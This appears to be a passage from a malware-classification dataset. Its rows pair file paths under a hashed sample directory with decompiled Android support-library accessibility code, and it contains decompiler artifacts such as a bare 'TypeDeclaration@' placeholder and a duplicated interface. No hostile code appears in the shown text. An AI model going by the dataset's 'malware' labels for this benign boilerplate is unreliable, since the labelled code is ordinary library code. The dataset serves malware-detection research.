onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         AccessibilityDelegateBridge.this.onPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return AccessibilityDelegateBridge.this.onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         AccessibilityDelegateBridge.this.sendAccessibilityEvent(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         AccessibilityDelegateBridge.this.sendAccessibilityEventUnchecked(view,accessibilityEvent);       }     } ;   }   public static Object newAccessibilityDelegateDefaultImpl(){     return new View.AccessibilityDelegate();   }   public static void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).onInitializeAccessibilityEvent(view,accessibilityEvent);   }   public static void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  Object obj2){     ((View.AccessibilityDelegate)obj).onInitializeAccessibilityNodeInfo(view,(AccessibilityNodeInfo)obj2);   }   public static void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).onPopulateAccessibilityEvent(view,accessibilityEvent);   }   public static boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return ((View.AccessibilityDelegate)obj).onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);   }   public static void sendAccessibilityEvent(  Object obj,  View view,  int i){     ((View.AccessibilityDelegate)obj).sendAccessibilityEvent(view,i);   }   public static void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     ((View.AccessibilityDelegate)obj).sendAccessibilityEventUnchecked(view,accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateCompatJellyBean.code","class AccessibilityDelegateCompatJellyBean { public interface AccessibilityDelegateBridgeJellyBean {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     Object getAccessibilityNodeProvider(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatJellyBean(){   }   public static Object getAccessibilityNodeProvider(  Object obj,  View view){     return ((View.AccessibilityDelegate)obj).getAccessibilityNodeProvider(view);   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridgeJellyBean accessibilityDelegateBridgeJellyBean){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return AccessibilityDelegateBridgeJellyBean.this.dispatchPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public AccessibilityNodeProvider getAccessibilityNodeProvider(      View view){         return (AccessibilityNodeProvider)AccessibilityDelegateBridgeJellyBean.this.getAccessibilityNodeProvider(view);       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityEvent(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      AccessibilityNodeInfo accessibilityNodeInfo){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityNodeInfo(view,accessibilityNodeInfo);       }       @Override public void onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         AccessibilityDelegateBridgeJellyBean.this.onPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return AccessibilityDelegateBridgeJellyBean.this.onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);       }       @Override public boolean performAccessibilityAction(      View view,      int i,      Bundle bundle){         return AccessibilityDelegateBridgeJellyBean.this.performAccessibilityAction(view,i,bundle);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEvent(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEventUnchecked(view,accessibilityEvent);       }     } ;   }   public static boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle){     return ((View.AccessibilityDelegate)obj).performAccessibilityAction(view,i,bundle);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateIcsImpl.code","class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {   AccessibilityDelegateIcsImpl(){   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(obj,view,accessibilityEvent);   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat accessibilityDelegateCompat){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return accessibilityDelegateCompat.dispatchPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         accessibilityDelegateCompat.onInitializeAccessibilityEvent(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      Object obj){         accessibilityDelegateCompat.onInitializeAccessibilityNodeInfo(view,new AccessibilityNodeInfoCompat(obj));       }       @Override public void onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         accessibilityDelegateCompat.onPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return accessibilityDelegateCompat.onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         accessibilityDelegateCompat.sendAccessibilityEvent(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         accessibilityDelegateCompat.sendAccessibilityEventUnchecked(view,accessibilityEvent);       }     } );   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();   }   @Override public void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(obj,view,accessibilityEvent);   }   @Override public void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(obj,view,accessibilityNodeInfoCompat.getInfo());   }   @Override public void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(obj,view,accessibilityEvent);   }   @Override public boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(obj,viewGroup,view,accessibilityEvent);   }   @Override public void sendAccessibilityEvent(  Object obj,  View view,  int i){     AccessibilityDelegateCompatIcs.sendAccessibilityEvent(obj,view,i);   }   @Override public void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(obj,view,accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateImpl.code","public interface AccessibilityDelegateImpl {   boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view);   Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat accessibilityDelegateCompat);   Object newAccessiblityDelegateDefaultImpl();   void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  Object obj,  View view,  int i);   void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateJellyBeanImpl.code","class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {   AccessibilityDelegateJellyBeanImpl(){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view){     Object accessibilityNodeProvider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(obj,view);     if (accessibilityNodeProvider != null) {       return new AccessibilityNodeProviderCompat(accessibilityNodeProvider);     }     return null;   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat accessibilityDelegateCompat){     return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         return accessibilityDelegateCompat.dispatchPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public Object getAccessibilityNodeProvider(      View view){         AccessibilityNodeProviderCompat accessibilityNodeProvider=accessibilityDelegateCompat.getAccessibilityNodeProvider(view);         if (accessibilityNodeProvider != null) {           return accessibilityNodeProvider.getProvider();         }         return null;       }       @Override public void onInitializeAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         accessibilityDelegateCompat.onInitializeAccessibilityEvent(view,accessibilityEvent);       }       @Override public void onInitializeAccessibilityNodeInfo(      View view,      Object obj){         accessibilityDelegateCompat.onInitializeAccessibilityNodeInfo(view,new AccessibilityNodeInfoCompat(obj));       }       @Override public void onPopulateAccessibilityEvent(      View view,      AccessibilityEvent accessibilityEvent){         accessibilityDelegateCompat.onPopulateAccessibilityEvent(view,accessibilityEvent);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return accessibilityDelegateCompat.onRequestSendAccessibilityEvent(viewGroup,view,accessibilityEvent);       }       @Override public boolean performAccessibilityAction(      View view,      int i,      Bundle bundle){         return accessibilityDelegateCompat.performAccessibilityAction(view,i,bundle);       }       @Override public void sendAccessibilityEvent(      View view,      int i){         accessibilityDelegateCompat.sendAccessibilityEvent(view,i);       }       @Override public void sendAccessibilityEventUnchecked(      View view,      AccessibilityEvent accessibilityEvent){         accessibilityDelegateCompat.sendAccessibilityEventUnchecked(view,accessibilityEvent);       }     } );   }   @Override public boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle){     return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(obj,view,i,bundle);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityDelegateStubImpl.code","class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {   AccessibilityDelegateStubImpl(){   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return false;   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view){     return null;   }   @Override public Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat accessibilityDelegateCompat){     return null;   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return null;   }   @Override public void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){   }   @Override public void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return true;   }   @Override public boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle){     return false;   }   @Override public void sendAccessibilityEvent(  Object obj,  View view,  int i){   }   @Override public void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityEventCompat.code","public class AccessibilityEventCompat {   private static final AccessibilityEventVersionImpl IMPL;   public static final int TYPES_ALL_MASK=-1;   public static final int TYPE_ANNOUNCEMENT=16384;   public static final int TYPE_GESTURE_DETECTION_END=524288;   public static final int TYPE_GESTURE_DETECTION_START=262144;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_END=1024;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_START=512;   public static final int TYPE_TOUCH_INTERACTION_END=2097152;   public static final int TYPE_TOUCH_INTERACTION_START=1048576;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUSED=32768;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED=65536;   public static final int TYPE_VIEW_HOVER_ENTER=128;   public static final int TYPE_VIEW_HOVER_EXIT=256;   public static final int TYPE_VIEW_SCROLLED=4096;   public static final int TYPE_VIEW_TEXT_SELECTION_CHANGED=8192;   public static final int TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY=131072;   public static final int TYPE_WINDOW_CONTENT_CHANGED=2048; class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {     AccessibilityEventIcsImpl(){     }     @Override public void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj){       AccessibilityEventCompatIcs.appendRecord(accessibilityEvent,obj);     }     @Override public Object getRecord(    AccessibilityEvent accessibilityEvent,    int i){       return AccessibilityEventCompatIcs.getRecord(accessibilityEvent,i);     }     @Override public int getRecordCount(    AccessibilityEvent accessibilityEvent){       return AccessibilityEventCompatIcs.getRecordCount(accessibilityEvent);     }   } class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {     AccessibilityEventStubImpl(){     }     @Override public void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj){     }     @Override public Object getRecord(    AccessibilityEvent accessibilityEvent,    int i){       return null;     }     @Override public int getRecordCount(    AccessibilityEvent accessibilityEvent){       return 0;     }   } interface AccessibilityEventVersionImpl {     void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj);     Object getRecord(    AccessibilityEvent accessibilityEvent,    int i);     int getRecordCount(    AccessibilityEvent accessibilityEvent);   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityEventIcsImpl();     }  else {       IMPL=new AccessibilityEventStubImpl();     }   }   private AccessibilityEventCompat(){   }   public static void appendRecord(  AccessibilityEvent accessibilityEvent,  AccessibilityRecordCompat accessibilityRecordCompat){     IMPL.appendRecord(accessibilityEvent,accessibilityRecordCompat.getImpl());   }   public static AccessibilityRecordCompat asRecord(  AccessibilityEvent accessibilityEvent){     return new AccessibilityRecordCompat(accessibilityEvent);   }   public static AccessibilityRecordCompat getRecord(  AccessibilityEvent accessibilityEvent,  int i){     return new AccessibilityRecordCompat(IMPL.getRecord(accessibilityEvent,i));   }   public static int getRecordCount(  AccessibilityEvent accessibilityEvent){     return IMPL.getRecordCount(accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityEventCompatIcs.code","class AccessibilityEventCompatIcs {   AccessibilityEventCompatIcs(){   }   public static void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj){     accessibilityEvent.appendRecord((AccessibilityRecord)obj);   }   public static Object getRecord(  AccessibilityEvent accessibilityEvent,  int i){     return accessibilityEvent.getRecord(i);   }   public static int getRecordCount(  AccessibilityEvent accessibilityEvent){     return accessibilityEvent.getRecordCount();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityEventIcsImpl.code","class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {   AccessibilityEventIcsImpl(){   }   @Override public void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj){     AccessibilityEventCompatIcs.appendRecord(accessibilityEvent,obj);   }   @Override public Object getRecord(  AccessibilityEvent accessibilityEvent,  int i){     return AccessibilityEventCompatIcs.getRecord(accessibilityEvent,i);   }   @Override public int getRecordCount(  AccessibilityEvent accessibilityEvent){     return AccessibilityEventCompatIcs.getRecordCount(accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityEventStubImpl.code","class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {   AccessibilityEventStubImpl(){   }   @Override public void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj){   }   @Override public Object getRecord(  AccessibilityEvent accessibilityEvent,  int i){     return null;   }   @Override public int getRecordCount(  AccessibilityEvent accessibilityEvent){     return 0;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityEventVersionImpl.code","interface AccessibilityEventVersionImpl {   void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj);   Object getRecord(  AccessibilityEvent accessibilityEvent,  int i);   int getRecordCount(  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoBridge.code","interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   Object findFocus(  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@410fb138"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoCompatIcs.code","class AccessibilityNodeInfoCompatIcs {   AccessibilityNodeInfoCompatIcs(){   }   public static void addAction(  Object obj,  int i){     ((AccessibilityNodeInfo)obj).addAction(i);   }   public static void addChild(  Object obj,  View view){     ((AccessibilityNodeInfo)obj).addChild(view);   }   public static List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str){     return ((AccessibilityNodeInfo)obj).findAccessibilityNodeInfosByText(str);   }   public static int getActions(  Object obj){     return ((AccessibilityNodeInfo)obj).getActions();   }   public static void getBoundsInParent(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).getBoundsInParent(rect);   }   public static void getBoundsInScreen(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).getBoundsInScreen(rect);   }   public static Object getChild(  Object obj,  int i){     return ((AccessibilityNodeInfo)obj).getChild(i);   }   public static int getChildCount(  Object obj){     return ((AccessibilityNodeInfo)obj).getChildCount();   }   public static CharSequence getClassName(  Object obj){     return ((AccessibilityNodeInfo)obj).getClassName();   }   public static CharSequence getContentDescription(  Object obj){     return ((AccessibilityNodeInfo)obj).getContentDescription();   }   public static CharSequence getPackageName(  Object obj){     return ((AccessibilityNodeInfo)obj).getPackageName();   }   public static Object getParent(  Object obj){     return ((AccessibilityNodeInfo)obj).getParent();   }   public static CharSequence getText(  Object obj){     return ((AccessibilityNodeInfo)obj).getText();   }   public static int getWindowId(  Object obj){     return ((AccessibilityNodeInfo)obj).getWindowId();   }   public static boolean isCheckable(  Object obj){     return ((AccessibilityNodeInfo)obj).isCheckable();   }   public static boolean isChecked(  Object obj){     return ((AccessibilityNodeInfo)obj).isChecked();   }   public static boolean isClickable(  Object obj){     return ((AccessibilityNodeInfo)obj).isClickable();   }   public static boolean isEnabled(  Object obj){     return ((AccessibilityNodeInfo)obj).isEnabled();   }   public static boolean isFocusable(  Object obj){     return ((AccessibilityNodeInfo)obj).isFocusable();   }   public static boolean isFocused(  Object obj){     return ((AccessibilityNodeInfo)obj).isFocused();   }   public static boolean isLongClickable(  Object obj){     return ((AccessibilityNodeInfo)obj).isLongClickable();   }   public static boolean isPassword(  Object obj){     return ((AccessibilityNodeInfo)obj).isPassword();   }   public static boolean isScrollable(  Object obj){     return ((AccessibilityNodeInfo)obj).isScrollable();   }   public static boolean isSelected(  Object obj){     return ((AccessibilityNodeInfo)obj).isSelected();   }   public static Object obtain(){     return AccessibilityNodeInfo.obtain();   }   public static Object obtain(  View view){     return AccessibilityNodeInfo.obtain(view);   }   public static Object obtain(  Object obj){     return AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)obj);   }   public static boolean performAction(  Object obj,  int i){     return ((AccessibilityNodeInfo)obj).performAction(i);   }   public static void recycle(  Object obj){     ((AccessibilityNodeInfo)obj).recycle();   }   public static void setBoundsInParent(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).setBoundsInParent(rect);   }   public static void setBoundsInScreen(  Object obj,  Rect rect){     ((AccessibilityNodeInfo)obj).setBoundsInScreen(rect);   }   public static void setCheckable(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setCheckable(z);   }   public static void setChecked(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setChecked(z);   }   public static void setClassName(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setClassName(charSequence);   }   public static void setClickable(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setClickable(z);   }   public static void setContentDescription(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setContentDescription(charSequence);   }   public static void setEnabled(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setEnabled(z);   }   public static void setFocusable(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setFocusable(z);   }   public static void setFocused(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setFocused(z);   }   public static void setLongClickable(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setLongClickable(z);   }   public static void setPackageName(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setPackageName(charSequence);   }   public static void setParent(  Object obj,  View view){     ((AccessibilityNodeInfo)obj).setParent(view);   }   public static void setPassword(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setPassword(z);   }   public static void setScrollable(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setScrollable(z);   }   public static void setSelected(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setSelected(z);   }   public static void setSource(  Object obj,  View view){     ((AccessibilityNodeInfo)obj).setSource(view);   }   public static void setText(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setText(charSequence);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoCompatJellyBean.code","class AccessibilityNodeInfoCompatJellyBean {   AccessibilityNodeInfoCompatJellyBean(){   }   public static void addChild(  Object obj,  View view,  int i){     ((AccessibilityNodeInfo)obj).addChild(view,i);   }   public static Object findFocus(  Object obj,  int i){     return ((AccessibilityNodeInfo)obj).findFocus(i);   }   public static Object focusSearch(  Object obj,  int i){     return ((AccessibilityNodeInfo)obj).focusSearch(i);   }   public static int getMovementGranularities(  Object obj){     return ((AccessibilityNodeInfo)obj).getMovementGranularities();   }   public static boolean isAccessibilityFocused(  Object obj){     return ((AccessibilityNodeInfo)obj).isAccessibilityFocused();   }   public static boolean isVisibleToUser(  Object obj){     return ((AccessibilityNodeInfo)obj).isVisibleToUser();   }   public static Object obtain(  View view,  int i){     return AccessibilityNodeInfo.obtain(view,i);   }   public static boolean performAction(  Object obj,  int i,  Bundle bundle){     return ((AccessibilityNodeInfo)obj).performAction(i,bundle);   }   public static void setAccesibilityFocused(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setAccessibilityFocused(z);   }   public static void setMovementGranularities(  Object obj,  int i){     ((AccessibilityNodeInfo)obj).setMovementGranularities(i);   }   public static void setParent(  Object obj,  View view,  int i){     ((AccessibilityNodeInfo)obj).setParent(view,i);   }   public static void setSource(  Object obj,  View view,  int i){     ((AccessibilityNodeInfo)obj).setSource(view,i);   }   public static void setVisibleToUser(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setVisibleToUser(z);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoCompatJellybeanMr2.code","class AccessibilityNodeInfoCompatJellybeanMr2 {   AccessibilityNodeInfoCompatJellybeanMr2(){   }   public static String getViewIdResourceName(  Object obj){     return ((AccessibilityNodeInfo)obj).getViewIdResourceName();   }   public static void setViewIdResourceName(  Object obj,  String str){     ((AccessibilityNodeInfo)obj).setViewIdResourceName(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoCompatKitKat.code","class AccessibilityNodeInfoCompatKitKat {   AccessibilityNodeInfoCompatKitKat(){   }   public static int getLiveRegion(  Object obj){     return ((AccessibilityNodeInfo)obj).getLiveRegion();   }   public static void setLiveRegion(  Object obj,  int i){     ((AccessibilityNodeInfo)obj).setLiveRegion(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoIcsImpl.code","class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {   AccessibilityNodeInfoIcsImpl(){   }   @Override public void addAction(  Object obj,  int i){     AccessibilityNodeInfoCompatIcs.addAction(obj,i);   }   @Override public void addChild(  Object obj,  View view){     AccessibilityNodeInfoCompatIcs.addChild(obj,view);   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str){     return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(obj,str);   }   @Override public int getActions(  Object obj){     return AccessibilityNodeInfoCompatIcs.getActions(obj);   }   @Override public void getBoundsInParent(  Object obj,  Rect rect){     AccessibilityNodeInfoCompatIcs.getBoundsInParent(obj,rect);   }   @Override public void getBoundsInScreen(  Object obj,  Rect rect){     AccessibilityNodeInfoCompatIcs.getBoundsInScreen(obj,rect);   }   @Override public Object getChild(  Object obj,  int i){     return AccessibilityNodeInfoCompatIcs.getChild(obj,i);   }   @Override public int getChildCount(  Object obj){     return AccessibilityNodeInfoCompatIcs.getChildCount(obj);   }   @Override public CharSequence getClassName(  Object obj){     return AccessibilityNodeInfoCompatIcs.getClassName(obj);   }   @Override public CharSequence getContentDescription(  Object obj){     return AccessibilityNodeInfoCompatIcs.getContentDescription(obj);   }   @Override public CharSequence getPackageName(  Object obj){     return AccessibilityNodeInfoCompatIcs.getPackageName(obj);   }   @Override public Object getParent(  Object obj){     return AccessibilityNodeInfoCompatIcs.getParent(obj);   }   @Override public CharSequence getText(  Object obj){     return AccessibilityNodeInfoCompatIcs.getText(obj);   }   @Override public int getWindowId(  Object obj){     return AccessibilityNodeInfoCompatIcs.getWindowId(obj);   }   @Override public boolean isCheckable(  Object obj){     return AccessibilityNodeInfoCompatIcs.isCheckable(obj);   }   @Override public boolean isChecked(  Object obj){     return AccessibilityNodeInfoCompatIcs.isChecked(obj);   }   @Override public boolean isClickable(  Object obj){     return AccessibilityNodeInfoCompatIcs.isClickable(obj);   }   @Override public boolean isEnabled(  Object obj){     return AccessibilityNodeInfoCompatIcs.isEnabled(obj);   }   @Override public boolean isFocusable(  Object 